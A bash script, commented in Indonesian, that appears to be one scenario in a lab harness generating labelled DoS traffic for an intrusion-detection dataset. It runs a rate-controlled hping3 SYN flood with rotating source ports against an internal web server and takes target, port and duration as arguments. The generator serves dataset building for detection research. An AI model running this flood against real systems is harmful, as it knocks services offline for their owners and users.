#!/usr/bin/env bash
# S11 — DoS (hping3 SYN flood, RATE TERKONTROL + ROTASI SOURCE-PORT). Kategori: DoS.
# Target default: srv-web :80. Fase: mana saja.
#
# DESAIN (Opsi B): hantam target dgn SET source-port terbatas (NPORTS), src IP TETAP =
# attacker (10.10.30.10) supaya pelabelan by-attacker-IP tak rusak. Tiap source-port =
# SATU koneksi DoS bervolume (BURST paket) -> argus hasilkan BANYAK flow DoS BERBEDA
# (variasi fitur nyata), bukan 1 tuple diduplikasi. Jumlah tuple dibatasi (NPORTS) ->
# argus AMAN (tak OOM seperti --rand-source yg bikin jutaan micro-flow).
SCN=S11; ATTACK_CAT=DoS; PHASE=any
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool hping3
banner

TARGET="${1:-$SRV_WEB}"; PORT="${2:-80}"; DURATION="${3:-60}"
SPORT_BASE="${4:-40000}"   # TETAP (bukan acak) -> set port stabil antar-iterasi run-1h
NPORTS="${5:-400}"         # jumlah source-port berbeda ≈ jumlah koneksi DoS dasar
BURST="${6:-200}"          # SYN per koneksi (sinyal DoS: spkts & sload tinggi per-flow)
ensure_up "$TARGET"
echo "SYN flood terkontrol -> $TARGET:$PORT ${DURATION}s; ${NPORTS} sport (base $SPORT_BASE), burst ${BURST} @~3300pps, src TETAP attacker."

mark_start "$TARGET:$PORT"
end=$(( $(date +%s) + DURATION )); i=0
while [ "$(date +%s)" -lt "$end" ]; do
  sp=$(( SPORT_BASE + (i % NPORTS) ))
  # -k -s <sp>: KUNCI source-port ke sp (1 koneksi); -c BURST: paket per koneksi; -i u300: ~3300pps
  sudo hping3 -S -p "$PORT" -s "$sp" -k -c "$BURST" -i u300 "$TARGET" >/dev/null 2>&1 || true
  i=$(( i + 1 ))
done
mark_end "$TARGET:$PORT"
echo "Selesai (DoS sample: ${NPORTS} koneksi bervolume, src IP attacker konstan)."
# CAVEAT:
# - JANGAN --flood --rand-source: jutaan micro-flow -> argus OOM (sensor) + pcap membengkak.
# - Src IP WAJIB tetap attacker (jangan spoof IP) -> kalau diacak, label by-attacker-IP rusak.
# - Jumlah flow DoS single-view ≈ fungsi(NPORTS, BURST, DURATION, bucket-2s dedup) -> UKUR
#   dari capture bersih lalu setel DURMAP S11 (lihat docs/phase8 §DURMAP).
# - Naikkan/turunkan intensitas lewat NPORTS/BURST, bukan dgn --flood.
